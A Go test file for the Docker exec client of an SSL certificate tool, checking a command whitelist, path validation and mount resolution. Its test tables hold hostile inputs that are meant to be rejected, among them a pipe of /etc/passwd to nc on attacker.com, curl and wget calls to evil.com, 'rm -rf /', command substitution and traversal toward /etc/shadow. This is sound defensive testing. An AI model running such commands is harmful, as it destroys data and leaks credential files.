package docker

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/zhuxbo/sslctl/pkg/util"
)

func TestValidateExecCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		// 基本命令
		{"nginx test", "nginx -t", false},
		{"nginx reload", "nginx -s reload", false},
		{"cat file", "cat /etc/nginx/nginx.conf", false},
		{"ls dir", "ls -1 /etc/nginx/", false},
		{"test file", "test -f /etc/nginx/nginx.conf", false},

		// ShellQuote 包裹的路径（回归测试）
		{"cat with ShellQuote", fmt.Sprintf("cat %s", util.ShellQuote("/path/with space")), false},
		{"cat with ShellQuote special", fmt.Sprintf("cat %s", util.ShellQuote("/etc/nginx/conf.d/site.conf")), false},
		{"ls with ShellQuote", fmt.Sprintf("ls -1 %s", util.ShellQuote("/etc/nginx/conf.d")), false},

		// ls glob 模式（回归测试）
		{"ls glob with redirect", "ls -1 /etc/nginx/conf.d/*.conf 2>/dev/null", false},
		{"ls glob simple", "ls -1 /etc/nginx/*.conf", false},

		// 条件执行
		{"test and echo", "test -f /etc/nginx/nginx.conf && echo ok", false},
		{"nginx test with redirect", "nginx -t 2>&1", false},

		// 危险命令 - 应该被拒绝
		{"command injection semicolon", "nginx -t; rm -rf /", true},
		{"command injection pipe", "cat /etc/passwd | nc attacker.com 80", true},
		{"command injection or", "nginx -t || rm -rf /", true},
		{"command substitution backtick", "cat `whoami`", true},
		{"command substitution dollar", "cat $(whoami)", true},
		{"variable expansion", "cat ${HOME}/file", true},
		{"newline injection", "nginx -t\nrm -rf /", true},

		// 不允许的命令
		{"disallowed command rm", "rm -rf /", true},
		{"disallowed command curl", "curl http://attacker.com", true},
		{"empty command", "", true},

		// 长度限制
		{"command too long", string(make([]byte, 4097)), true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateExecCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateExecCommand(%q) error = %v, wantErr %v", tt.cmd, err, tt.wantErr)
			}
		})
	}
}

func TestValidateExecCommand_ShellQuoteRegression(t *testing.T) {
	// 专门测试 ShellQuote 产生的命令格式
	// ShellQuote 使用单引号包裹路径，如: '/path/to/file'
	// 如果路径包含单引号，会转义为: 'path'\''with'\''quote'

	testCases := []struct {
		name string
		path string
	}{
		{"simple path", "/etc/nginx/nginx.conf"},
		{"path with space", "/etc/nginx/conf.d/my site.conf"},
		{"path with special chars", "/etc/nginx/conf.d/site-name_v2.conf"},
		{"deep path", "/var/www/html/sites/example.com/nginx.conf"},
	}

	for _, tc := range testCases {
		t.Run("cat "+tc.name, func(t *testing.T) {
			cmd := fmt.Sprintf("cat %s", util.ShellQuote(tc.path))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v", cmd, err)
			}
		})

		t.Run("ls "+tc.name, func(t *testing.T) {
			cmd := fmt.Sprintf("ls -1 %s", util.ShellQuote(tc.path))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v", cmd, err)
			}
		})
	}
}

func TestValidateExecCommand_LsGlobRegression(t *testing.T) {
	// 回归测试：验证 Docker 扫描器使用的 ls glob 模式
	// 来自 internal/nginx/docker/scanner.go:172
	// output, err := s.client.Exec(ctx, fmt.Sprintf("ls -1 %s/*.conf 2>/dev/null", util.ShellQuote(dir)))

	testCases := []struct {
		name string
		dir  string
	}{
		{"nginx conf.d", "/etc/nginx/conf.d"},
		{"nginx sites-enabled", "/etc/nginx/sites-enabled"},
		{"path with space", "/etc/nginx/my configs"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// 模拟 scanner.go 的实际调用模式
			cmd := fmt.Sprintf("ls -1 %s/*.conf 2>/dev/null", util.ShellQuote(tc.dir))
			if err := validateExecCommand(cmd); err != nil {
				t.Errorf("validateExecCommand(%q) failed: %v\nThis breaks Docker scanner functionality!", cmd, err)
			}
		})
	}
}

func TestFindMountForPath(t *testing.T) {
	client := NewClient("abc123")
	mounts := []MountInfo{
		{Type: "bind", Source: "/host/nginx", Destination: "/etc/nginx", RW: true},
		{Type: "bind", Source: "/host/ssl", Destination: "/etc/nginx/ssl", RW: true},
		{Type: "bind", Source: "/host/www", Destination: "/var/www", RW: true},
		{Type: "volume", Source: "data-vol", Destination: "/data", RW: true},    // volume 类型，应忽略
		{Type: "bind", Source: "/host/ro", Destination: "/readonly", RW: false}, // 只读，应忽略
	}

	tests := []struct {
		name          string
		containerPath string
		wantSource    string
		wantNil       bool
	}{
		{"最长路径匹配", "/etc/nginx/ssl/cert.pem", "/host/ssl", false},
		{"次长路径匹配", "/etc/nginx/conf.d/site.conf", "/host/nginx", false},
		{"www 路径", "/var/www/html/index.html", "/host/www", false},
		{"无匹配", "/opt/app/file", "", true},
		{"volume 类型忽略", "/data/file", "", true},
		{"只读挂载忽略", "/readonly/file", "", true},
		{"类似前缀不误匹配", "/etc/nginx-backup/conf", "", true}, // /etc/nginx 不应匹配 /etc/nginx-backup
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mount := client.FindMountForPath(mounts, tt.containerPath)
			if tt.wantNil {
				if mount != nil {
					t.Errorf("expected nil, got mount with source %q", mount.Source)
				}
				return
			}
			if mount == nil {
				t.Fatal("expected non-nil mount")
			}
			if mount.Source != tt.wantSource {
				t.Errorf("mount.Source = %q, want %q", mount.Source, tt.wantSource)
			}
		})
	}
}

func TestFindMountForPath_RootMount(t *testing.T) {
	client := NewClient("abc123")
	// 根挂载场景：容器整个文件系统挂载到宿主机目录
	mounts := []MountInfo{
		{Type: "bind", Source: "/host/container-root", Destination: "/", RW: true},
		{Type: "bind", Source: "/host/nginx", Destination: "/etc/nginx", RW: true}, // 更精确的挂载
	}

	tests := []struct {
		name          string
		containerPath string
		wantSource    string
	}{
		{"根挂载匹配任意绝对路径", "/opt/app/config", "/host/container-root"},
		{"更精确挂载优先", "/etc/nginx/nginx.conf", "/host/nginx"},
		{"根挂载匹配深层路径", "/var/log/app.log", "/host/container-root"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mount := client.FindMountForPath(mounts, tt.containerPath)
			if mount == nil {
				t.Fatal("expected non-nil mount")
			}
			if mount.Source != tt.wantSource {
				t.Errorf("mount.Source = %q, want %q", mount.Source, tt.wantSource)
			}
		})
	}
}

func TestResolveHostPath(t *testing.T) {
	client := NewClient("abc123")

	tests := []struct {
		name          string
		containerPath string
		mount         *MountInfo
		want          string
	}{
		{
			name:          "简单路径转换",
			containerPath: "/etc/nginx/ssl/cert.pem",
			mount:         &MountInfo{Source: "/host/ssl", Destination: "/etc/nginx/ssl"},
			want:          "/host/ssl/cert.pem",
		},
		{
			name:          "深层路径",
			containerPath: "/var/www/html/sites/example.com/index.html",
			mount:         &MountInfo{Source: "/host/www", Destination: "/var/www"},
			want:          "/host/www/html/sites/example.com/index.html",
		},
		{
			name:          "完全匹配",
			containerPath: "/etc/nginx",
			mount:         &MountInfo{Source: "/host/nginx", Destination: "/etc/nginx"},
			want:          "/host/nginx",
		},
		{
			name:          "nil mount",
			containerPath: "/etc/nginx/cert.pem",
			mount:         nil,
			want:          "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := client.ResolveHostPath(tt.containerPath, tt.mount)
			if got != tt.want {
				t.Errorf("ResolveHostPath(%q) = %q, want %q", tt.containerPath, got, tt.want)
			}
		})
	}
}

func TestNewClient(t *testing.T) {
	client := NewClient("test-container-id")
	if client.GetContainerID() != "test-container-id" {
		t.Errorf("GetContainerID() = %q", client.GetContainerID())
	}
	if client.IsComposeMode() {
		t.Error("expected IsComposeMode() = false")
	}
}

func TestNewComposeClient(t *testing.T) {
	client := NewComposeClient("/path/docker-compose.yml", "nginx")
	if !client.IsComposeMode() {
		t.Error("expected IsComposeMode() = true")
	}
}

func TestSetContainer(t *testing.T) {
	client := NewClient("")
	client.SetContainer("new-id")
	if client.GetContainerID() != "new-id" {
		t.Errorf("GetContainerID() = %q after SetContainer", client.GetContainerID())
	}
}

func TestIsNumeric(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"123", true},
		{"644", true},
		{"0", true},
		{"", false},
		{"abc", false},
		{"12a", false},
		{"-1", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			if got := isNumeric(tt.input); got != tt.want {
				t.Errorf("isNumeric(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestTruncateOutput(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"empty string", "", ""},
		{"short string", "hello world", "hello world"},
		{"exactly 200 chars", string(make([]byte, 200)), string(make([]byte, 200))}, // 200 个 null 字节
		{"newline replaced", "line1\nline2\nline3", "line1 line2 line3"},
		{"carriage return removed", "line1\r\nline2", "line1 line2"},
		{"mixed newlines", "a\nb\rc\r\nd", "a bc d"},
	}

	// 生成超长字符串
	longInput := strings.Repeat("x", 250)
	tests = append(tests, struct {
		name string
		in   string
		want string
	}{"over 200 chars truncated", longInput, strings.Repeat("x", 200) + "..."})

	// 含换行 + 超长
	longWithNewlines := strings.Repeat("a\n", 150)
	replaced := strings.ReplaceAll(longWithNewlines, "\n", " ")
	tests = append(tests, struct {
		name string
		in   string
		want string
	}{"newlines replaced then truncated", longWithNewlines, replaced[:200] + "..."})

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := truncateOutput(tt.in)
			if got != tt.want {
				t.Errorf("truncateOutput() = %q (len %d), want %q (len %d)", got, len(got), tt.want, len(tt.want))
			}
		})
	}
}

func TestTruncateOutput_NeverContainsNewlines(t *testing.T) {
	inputs := []string{
		"single\nline",
		"multi\n\n\nlines",
		"\n\n\n",
		"cr\ronly",
		"mixed\r\n\r\n",
		strings.Repeat("line\n", 100),
	}

	for _, input := range inputs {
		result := truncateOutput(input)
		if strings.Contains(result, "\n") {
			t.Errorf("truncateOutput(%q) contains \\n: %q", input, result)
		}
		if strings.Contains(result, "\r") {
			t.Errorf("truncateOutput(%q) contains \\r: %q", input, result)
		}
	}
}

func TestEnsureTimeout(t *testing.T) {
	t.Run("adds timeout when no deadline", func(t *testing.T) {
		ctx := context.Background()
		newCtx, cancel := ensureTimeout(ctx, 5*time.Second)
		defer cancel()

		deadline, ok := newCtx.Deadline()
		if !ok {
			t.Fatal("expected deadline to be set")
		}
		// deadline 应在 5 秒内
		remaining := time.Until(deadline)
		if remaining <= 0 || remaining > 5*time.Second {
			t.Errorf("unexpected remaining time: %v", remaining)
		}
	})

	t.Run("preserves existing deadline", func(t *testing.T) {
		originalDeadline := time.Now().Add(10 * time.Second)
		ctx, origCancel := context.WithDeadline(context.Background(), originalDeadline)
		defer origCancel()

		newCtx, cancel := ensureTimeout(ctx, 1*time.Second)
		defer cancel()

		deadline, ok := newCtx.Deadline()
		if !ok {
			t.Fatal("expected deadline to be set")
		}
		// 应保留原始的 10s deadline，而非新设 1s
		if !deadline.Equal(originalDeadline) {
			t.Errorf("deadline changed: got %v, want %v", deadline, originalDeadline)
		}
	})

	t.Run("cancel func is safe to call", func(t *testing.T) {
		// 有 deadline 时返回的 cancel 应是 no-op，调用不 panic
		ctx, origCancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer origCancel()

		_, cancel := ensureTimeout(ctx, 1*time.Second)
		cancel() // 不应 panic
		cancel() // 多次调用也不 panic
	})
}

func TestExecAux_Whitelist(t *testing.T) {
	t.Run("allowed commands", func(t *testing.T) {
		allowedCmds := []struct {
			cmd  string
			args []string
		}{
			{"mkdir", []string{"-p", "/etc/nginx/ssl"}},
			{"chmod", []string{"644", "/etc/nginx/ssl/cert.pem"}},
			{"chmod", []string{"600", "/etc/nginx/ssl/key.pem"}},
			{"mkdir", []string{"/etc/nginx/certs"}},
		}

		// 使用空 client 测试白名单逻辑：允许的命令应走到 "no container" 错误而非白名单拒绝
		client := NewClient("")
		ctx := context.Background()

		for _, tc := range allowedCmds {
			t.Run(tc.cmd+" "+strings.Join(tc.args, " "), func(t *testing.T) {
				_, err := client.ExecAux(ctx, tc.cmd, tc.args...)
				if err == nil {
					t.Fatal("expected error (no container), got nil")
				}
				// 应该是 "no container specified" 而不是 "command not allowed"
				if strings.Contains(err.Error(), "not allowed") {
					t.Errorf("command should be allowed but got: %v", err)
				}
				if !strings.Contains(err.Error(), "no container specified") {
					t.Errorf("unexpected error: %v", err)
				}
			})
		}
	})

	t.Run("disallowed commands", func(t *testing.T) {
		disallowedCmds := []struct {
			cmd  string
			args []string
		}{
			{"rm", []string{"-rf", "/"}},
			{"bash", []string{"-c", "whoami"}},
			{"curl", []string{"http://evil.com"}},
			{"cat", []string{"/etc/passwd"}},
			{"wget", []string{"http://evil.com"}},
			{"sh", []string{"-c", "id"}},
			{"python", []string{"-c", "import os"}},
		}

		client := NewClient("test-container")
		ctx := context.Background()

		for _, tc := range disallowedCmds {
			t.Run(tc.cmd, func(t *testing.T) {
				_, err := client.ExecAux(ctx, tc.cmd, tc.args...)
				if err == nil {
					t.Fatalf("expected error for disallowed command %q", tc.cmd)
				}
				if !strings.Contains(err.Error(), "not allowed") {
					t.Errorf("expected 'not allowed' error, got: %v", err)
				}
			})
		}
	})

	t.Run("empty command", func(t *testing.T) {
		client := NewClient("test-container")
		_, err := client.ExecAux(context.Background(), "")
		if err == nil {
			t.Fatal("expected error for empty command")
		}
		if !strings.Contains(err.Error(), "not allowed") {
			t.Errorf("expected 'not allowed' error, got: %v", err)
		}
	})

	t.Run("no container specified", func(t *testing.T) {
		client := &Client{} // 空 client，无 container 也无 compose
		_, err := client.ExecAux(context.Background(), "mkdir", "-p", "/etc/nginx/ssl")
		if err == nil {
			t.Fatal("expected error")
		}
		if !strings.Contains(err.Error(), "no container specified") {
			t.Errorf("expected 'no container specified', got: %v", err)
		}
	})
}

func TestExecAux_PathValidation(t *testing.T) {
	client := NewClient("") // 空 container 用于触发路径验证

	tests := []struct {
		name    string
		cmd     string
		args    []string
		wantErr string
	}{
		{
			name:    "invalid path with traversal",
			cmd:     "mkdir",
			args:    []string{"-p", "/etc/nginx/../../../etc/shadow"},
			wantErr: "invalid path",
		},
		{
			name:    "relative path rejected",
			cmd:     "mkdir",
			args:    []string{"etc/nginx"},
			wantErr: "invalid path",
		},
		{
			name:    "path with semicolon",
			cmd:     "chmod",
			args:    []string{"644", "/etc/nginx/;rm -rf /"},
			wantErr: "invalid path",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := client.ExecAux(context.Background(), tt.cmd, tt.args...)
			if err == nil {
				t.Fatal("expected error")
			}
			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("expected error containing %q, got: %v", tt.wantErr, err)
			}
		})
	}
}

func TestExec_WhitelistReject(t *testing.T) {
	// 测试 Exec 方法的白名单拒绝分支
	client := NewClient("test-container")
	ctx := context.Background()

	tests := []struct {
		name string
		cmd  string
	}{
		{"rm command", "rm -rf /"},
		{"curl command", "curl http://evil.com"},
		{"empty command", ""},
		{"bash command", "bash -c whoami"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := client.Exec(ctx, tt.cmd)
			if err == nil {
				t.Fatal("expected error for disallowed command")
			}
			// 应该是白名单拒绝错误，不是 docker exec 执行错误
			errMsg := err.Error()
			if !strings.Contains(errMsg, "not allowed") && !strings.Contains(errMsg, "empty command") {
				t.Errorf("expected whitelist rejection, got: %v", err)
			}
		})
	}
}

func TestExec_NoContainer(t *testing.T) {
	client := &Client{} // 无 container 也无 compose
	_, err := client.Exec(context.Background(), "nginx -t")
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "no container specified") {
		t.Errorf("expected 'no container specified', got: %v", err)
	}
}

func TestExecAux_ComposeMode(t *testing.T) {
	// compose 模式下，允许的命令应走到 docker-compose exec（会失败因为无 compose），
	// 但不应被白名单拒绝
	client := NewComposeClient("/path/docker-compose.yml", "web")

	_, err := client.ExecAux(context.Background(), "mkdir", "-p", "/etc/nginx/ssl")
	if err == nil {
		t.Fatal("expected error (compose exec fails)")
	}
	// 不应是白名单错误或 container 错误
	if strings.Contains(err.Error(), "not allowed") {
		t.Errorf("command should be allowed: %v", err)
	}
	if strings.Contains(err.Error(), "no container specified") {
		t.Errorf("compose mode should not require containerID: %v", err)
	}
}

func TestExecAux_FlagArgs(t *testing.T) {
	// 测试 flag 参数（-p）和数字参数（644）的特殊处理
	client := NewClient("")
	ctx := context.Background()

	// flag 参数和数字参数应该跳过路径验证
	tests := []struct {
		name string
		cmd  string
		args []string
	}{
		{"mkdir with flag", "mkdir", []string{"-p", "/etc/nginx/ssl"}},
		{"chmod with mode", "chmod", []string{"644", "/etc/nginx/ssl/cert.pem"}},
		{"chmod with 600", "chmod", []string{"600", "/etc/nginx/ssl/key.pem"}},
		{"chmod with 0755", "chmod", []string{"0755", "/etc/nginx/bin"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := client.ExecAux(ctx, tt.cmd, tt.args...)
			if err == nil {
				t.Fatal("expected error (no container)")
			}
			// 应该是 "no container" 而非路径验证错误
			if strings.Contains(err.Error(), "invalid path") {
				t.Errorf("flag/numeric args should skip path validation: %v", err)
			}
		})
	}
}

func TestValidateExecCommand_ChainedCommands(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		// && 链中不允许的命令
		{"chain with disallowed rm", "test -f /file && rm -rf /", true},
		{"chain with disallowed curl", "test -f /file && curl evil.com", true},
		// && 链中允许 echo
		{"chain with echo", "test -f /etc/nginx/nginx.conf && echo ok", false},
		// 三段链都是允许的命令
		{"triple chain all allowed", "test -f /file && echo exists && ls -1 /dir", false},
		// 空链段（&& 之间无内容）
		{"empty chain segment", "test -f /file && && echo ok", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateExecCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateExecCommand(%q) error = %v, wantErr %v", tt.cmd, err, tt.wantErr)
			}
		})
	}
}

func TestCopyToContainer_NoContainer(t *testing.T) {
	client := &Client{}
	err := client.CopyToContainer(context.Background(), "/tmp/cert.pem", "/ssl/cert.pem")
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "no container specified") {
		t.Errorf("expected 'no container specified', got: %v", err)
	}
}

func TestCopyToContainer_InvalidPath(t *testing.T) {
	client := NewClient("test-container")
	err := client.CopyToContainer(context.Background(), "/tmp/cert.pem", "/ssl/../../../etc/shadow")
	if err == nil {
		t.Fatal("expected error for path traversal")
	}
	if !strings.Contains(err.Error(), "invalid container path") {
		t.Errorf("expected 'invalid container path', got: %v", err)
	}
}

func TestCopyFromContainer_NoContainer(t *testing.T) {
	client := &Client{}
	err := client.CopyFromContainer(context.Background(), "/ssl/cert.pem", "/tmp/cert.pem")
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "no container specified") {
		t.Errorf("expected 'no container specified', got: %v", err)
	}
}

func TestCopyFromContainer_InvalidPath(t *testing.T) {
	client := NewClient("test-container")
	err := client.CopyFromContainer(context.Background(), "/ssl/../../../etc/shadow", "/tmp/cert.pem")
	if err == nil {
		t.Fatal("expected error for path traversal")
	}
	if !strings.Contains(err.Error(), "invalid container path") {
		t.Errorf("expected 'invalid container path', got: %v", err)
	}
}

func TestCopyToContainer_RelativePath(t *testing.T) {
	client := NewClient("test-container")
	err := client.CopyToContainer(context.Background(), "/tmp/cert.pem", "relative/path")
	if err == nil {
		t.Fatal("expected error for relative path")
	}
	if !strings.Contains(err.Error(), "invalid container path") {
		t.Errorf("expected 'invalid container path', got: %v", err)
	}
}

func TestCopyFromContainer_EmptyPath(t *testing.T) {
	client := NewClient("test-container")
	err := client.CopyFromContainer(context.Background(), "", "/tmp/cert.pem")
	if err == nil {
		t.Fatal("expected error for empty path")
	}
}

func TestExec_ComposeMode(t *testing.T) {
	// compose 模式下，允许的命令应走到 docker-compose exec（会失败），不是白名单拒绝
	client := NewComposeClient("/path/docker-compose.yml", "web")
	_, err := client.Exec(context.Background(), "nginx -t")
	if err == nil {
		t.Fatal("expected error (compose exec fails)")
	}
	// 不应是白名单错误
	if strings.Contains(err.Error(), "not allowed") {
		t.Errorf("should not be whitelist rejection: %v", err)
	}
}

func TestExec_ContainerMode(t *testing.T) {
	// container 模式下，允许的命令应走到 docker exec（会失败）
	client := NewClient("test-container-id")
	_, err := client.Exec(context.Background(), "nginx -t")
	if err == nil {
		t.Fatal("expected error (docker exec fails)")
	}
	if strings.Contains(err.Error(), "not allowed") {
		t.Errorf("should not be whitelist rejection: %v", err)
	}
}

func TestCopyToContainer_ComposeMode(t *testing.T) {
	client := NewComposeClient("/path/docker-compose.yml", "web")
	// 合法容器路径，走到 compose cp（会失败）
	err := client.CopyToContainer(context.Background(), "/tmp/cert.pem", "/etc/nginx/ssl/cert.pem")
	if err == nil {
		t.Fatal("expected error (compose cp fails)")
	}
	// 应是 docker cp 执行失败，不是路径验证错误
	if strings.Contains(err.Error(), "invalid container path") {
		t.Errorf("should not be path validation error: %v", err)
	}
}

func TestCopyFromContainer_ComposeMode(t *testing.T) {
	client := NewComposeClient("/path/docker-compose.yml", "web")
	err := client.CopyFromContainer(context.Background(), "/etc/nginx/ssl/cert.pem", "/tmp/cert.pem")
	if err == nil {
		t.Fatal("expected error (compose cp fails)")
	}
	if strings.Contains(err.Error(), "invalid container path") {
		t.Errorf("should not be path validation error: %v", err)
	}
}

func TestGetContainerInfo_NoContainer(t *testing.T) {
	client := &Client{}
	_, err := client.GetContainerInfo(context.Background())
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "no container specified") {
		t.Errorf("expected 'no container specified', got: %v", err)
	}
}

func TestIsValidContainerPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{"valid absolute path", "/etc/nginx/nginx.conf", true},
		{"valid deep path", "/var/www/html/site/cert.pem", true},
		{"empty path", "", false},
		{"relative path", "etc/nginx/nginx.conf", false},
		{"path traversal", "/etc/nginx/../passwd", false},
		{"path with semicolon", "/etc/nginx/;rm -rf /", false},
		{"path with pipe", "/etc/nginx/|cat", false},
		{"path with backtick", "/etc/nginx/`whoami`", false},
		{"path with dollar paren", "/etc/nginx/$(whoami)", false},
		{"path too long", "/" + string(make([]byte, 4096)), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isValidContainerPath(tt.path); got != tt.want {
				t.Errorf("isValidContainerPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}
